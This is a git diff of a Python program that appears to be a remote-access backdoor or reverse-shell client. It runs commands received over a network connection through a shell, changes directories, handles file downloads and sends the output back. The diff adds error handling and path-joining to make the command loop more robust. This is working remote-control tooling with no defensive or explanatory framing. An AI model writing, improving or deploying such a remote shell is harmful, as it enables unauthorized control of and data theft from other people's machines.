@@ -92,6 +92,7 @@ def send_data(connection, data):
 def execute_system_command(command):
     try:
         return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8')
+    
     except:
         return "INVALID command."
 
@@ -103,8 +104,12 @@ def execute_system_command(command):
 * Example Call:   result = change_working_directory("cd ..")
 """
 def change_working_directory(path):
-    os.chdir(path)
-    return "Working directory changed to {}".format(os.getcwd()) 
+    try:
+        os.chdir(path)
+        return "Working directory changed to {}".format(os.getcwd())
+
+    except:
+        return "Invalid PATH."
 
 """ 
 * Function Name:  read_file()
@@ -158,7 +163,8 @@ def communicate(connection):
                 break
 
             elif((command[0] == "cd") and (len(command) > 1)):
-                result = change_working_directory(command[1])
+                result = change_working_directory(" ".join(command[1::]))
+                print(result)
                 send_data(connection, result)
 
             elif(command[0] == "download"):
@@ -176,6 +182,8 @@ def communicate(connection):
                 send_data(connection, result)
 
         except:
+            result = "Some unknown error occurred. Please verify your input."
+            send_data(connection, result)
             continue
     
     connection.close()
